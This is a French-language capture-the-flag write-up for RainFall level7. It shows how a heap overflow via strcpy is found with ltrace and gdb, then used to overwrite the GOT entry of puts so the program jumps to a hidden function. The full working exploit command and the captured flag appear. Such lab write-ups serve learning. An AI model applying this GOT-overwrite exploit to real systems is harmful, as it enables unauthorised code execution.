Le binaire attends des arguments sinon segfault:

$level7@RainFall:~$ ./level7
    Segmentation fault (core dumped)
$level7@RainFall:~$ ./level7 a
    Segmentation fault (core dumped)
$level7@RainFall:~$ ./level7 a a
    ~~

Le programme veut deux arguments.

En lancant le binaire avec ltrace on voit :

malloc(8)= 0x0804a008
malloc(8)= 0x0804a018
malloc(8)= 0x0804a028
malloc(8)= 0x0804a038
strcpy(0x0804a018, "a")= 0x0804a018
strcpy(0x0804a038, "a")= 0x0804a038
fopen("/home/user/level8/.pass", "r")= 0
fgets( <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++

Deux call a strcpy, vulnerable aux overflow.

Aussi en faisant info functions et via le code decompile on voit une fonction m inutilisee qui print time et une variable, on va essayer d'appeler cette fonction.

On cherche combien de caractere fait overflow le premier argument:

$level7@RainFall:~$ ./level7 aaaaaaaaaaaaaaaaaaaa a
    ~~
$level7@RainFall:~$ ./level7 aaaaaaaaaaaaaaaaaaaaa a
    Segmentation fault (core dumped)

On peut overflow le premier argument apres le 20e charactere.

On va utiliser cet overflow pour appeler m a la place de puts, en fait on va ecrire dans le got a l'adresse de puts, l'adresse de m

trouver puts dans la global of table : 

(gdb) disas puts
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:	jmp    *0x8049928
   0x08048406 <+6>:	push   $0x28
   0x0804840b <+11>:	jmp    0x80483a0
End of assembler dump.
(gdb) disas 0x8049928
Dump of assembler code for function puts@got.plt:
   0x08049928 <+0>:	push   %es 
   0x08049929 <+1>:	test   %al,(%eax,%ecx,1)
End of assembler dump.

>> 0x08049928 

$ltrace ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') "a"
strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAA(\231\004\b")= 0x0804a018
strcpy(0x08049928, "a") = 0x08049928

On ecrit bien dans l'adresse de puts (0x08049928)

Plus qu'a remplacer le deuxieme argument avec la fonction m :

(gdb) disas m
Dump of assembler code for function m:
   0x080484f4 <+0>:	push   %ebp

>> 0x080484f4

level7@RainFall:~$ ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9 << flag 
 - 1653920972 << unix timestamp 
